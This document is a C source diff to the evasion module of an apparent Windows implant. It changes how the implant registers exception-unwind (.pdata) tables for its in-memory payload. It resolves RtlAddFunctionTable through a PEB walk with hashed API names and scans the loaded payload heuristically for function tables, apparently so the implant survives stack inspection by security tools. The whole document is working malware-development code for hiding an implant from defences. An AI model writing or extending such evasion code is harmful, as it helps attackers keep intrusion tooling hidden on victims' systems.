@@ -18,21 +18,13 @@
 #include "ntdefs.h"
 #include "evasion.h"
 #include "peb.h"
+#include "config.h"
 
 /* ------------------------------------------------------------------ */
 /*  DJB2 hash for RtlAddFunctionTable                                  */
 /* ------------------------------------------------------------------ */
 
-#define HASH_RTLADDFUNCTIONTABLE  0xE0C3DCE6
-
-/* ------------------------------------------------------------------ */
-/*  Linker-provided symbols for .pdata boundaries                      */
-/* ------------------------------------------------------------------ */
-
-extern BYTE __pdata_start[];
-extern BYTE __pdata_end[];
-extern BYTE __xdata_start[];
-extern BYTE __xdata_end[];
+#define HASH_RTLADDFUNCTIONTABLE  0x4DCFB62E
 
 /* ------------------------------------------------------------------ */
 /*  RtlAddFunctionTable function pointer typedef                       */
@@ -49,21 +41,84 @@ typedef BOOL (__attribute__((ms_abi)) *fn_RtlAddFunctionTable)(
 /* ------------------------------------------------------------------ */
 
 NTSTATUS evasion_register_pdata(EVASION_CONTEXT *ctx, PVOID implant_base) {
-    if (!ctx)
+    if (!ctx || !implant_base)
         return STATUS_INVALID_PARAMETER;
 
-    /* Calculate .pdata extent from linker symbols */
-    PBYTE pdata_begin = __pdata_start;
-    PBYTE pdata_end_p = __pdata_end;
-
-    if (pdata_begin >= pdata_end_p)
-        return STATUS_NOT_FOUND;  /* No .pdata entries emitted */
-
-    SIZE_T pdata_size = (SIZE_T)(pdata_end_p - pdata_begin);
-    DWORD entry_count = (DWORD)(pdata_size / sizeof(RUNTIME_FUNCTION));
-
-    if (entry_count == 0)
+    SIZE_T payload_size = cfg_get_payload_size();
+    if (payload_size < 0x2000)
         return STATUS_NOT_FOUND;
+
+    PBYTE base = (PBYTE)implant_base;
+    IMPLANT_CONFIG *cfg = NULL;
+    if (ctx->implant_ctx)
+        cfg = cfg_get(ctx->implant_ctx);
+    if (cfg && cfg->pdata_offset != 0 && cfg->pdata_count != 0) {
+        SIZE_T pdata_size = (SIZE_T)cfg->pdata_count * sizeof(RUNTIME_FUNCTION);
+        if ((SIZE_T)cfg->pdata_offset + pdata_size <= payload_size) {
+            PRUNTIME_FUNCTION pdata_begin =
+                (PRUNTIME_FUNCTION)(base + cfg->pdata_offset);
+
+            PVOID ntdll_base = find_module_by_hash(HASH_NTDLL_DLL);
+            if (!ntdll_base)
+                return STATUS_NOT_FOUND;
+
+            fn_RtlAddFunctionTable pRtlAddFunctionTable =
+                (fn_RtlAddFunctionTable)find_export_by_hash(
+                    ntdll_base, HASH_RTLADDFUNCTIONTABLE);
+            if (!pRtlAddFunctionTable)
+                return STATUS_PROCEDURE_NOT_FOUND;
+
+            BOOL ok = pRtlAddFunctionTable(
+                pdata_begin,
+                cfg->pdata_count,
+                (QWORD)(ULONG_PTR)implant_base
+            );
+            if (!ok)
+                return STATUS_UNSUCCESSFUL;
+
+            ctx->pdata_table = pdata_begin;
+            ctx->pdata_count = cfg->pdata_count;
+            return STATUS_SUCCESS;
+        }
+    }
+
+    SIZE_T best_offset = 0;
+    DWORD best_count = 0;
+
+    for (SIZE_T off = 0x1000;
+         off + (sizeof(RUNTIME_FUNCTION) * 8) < payload_size;
+         off += 4) {
+        PRUNTIME_FUNCTION table = (PRUNTIME_FUNCTION)(base + off);
+        DWORD count = 0;
+        DWORD prev_begin = 0;
+
+        while (off + ((SIZE_T)count + 1) * sizeof(RUNTIME_FUNCTION) <= payload_size) {
+            RUNTIME_FUNCTION *entry = &table[count];
+            if (entry->BeginAddress == 0 ||
+                entry->BeginAddress >= entry->EndAddress ||
+                entry->EndAddress >= payload_size ||
+                entry->UnwindInfoAddress >= payload_size ||
+                entry->UnwindInfoAddress < 0x20000 ||
+                entry->BeginAddress < prev_begin ||
+                (entry->EndAddress - entry->BeginAddress) > 0x20000) {
+                break;
+            }
+
+            prev_begin = entry->BeginAddress;
+            count++;
+        }
+
+        if (count > best_count) {
+            best_count = count;
+            best_offset = off;
+        }
+    }
+
+    if (best_count < 8)
+        return STATUS_NOT_FOUND;
+
+    PRUNTIME_FUNCTION pdata_begin = (PRUNTIME_FUNCTION)(base + best_offset);
+    DWORD entry_count = best_count;
 
     /* Resolve RtlAddFunctionTable from ntdll via PEB walk.
        This is a regular user-mode API, not a syscall. */
@@ -86,7 +141,7 @@ NTSTATUS evasion_register_pdata(EVASION_CONTEXT *ctx, PVOID implant_base) {
     QWORD base_addr = (QWORD)(ULONG_PTR)implant_base;
 
     BOOL ok = pRtlAddFunctionTable(
-        (PRUNTIME_FUNCTION)pdata_begin,
+        pdata_begin,
         entry_count,
         base_addr
     );
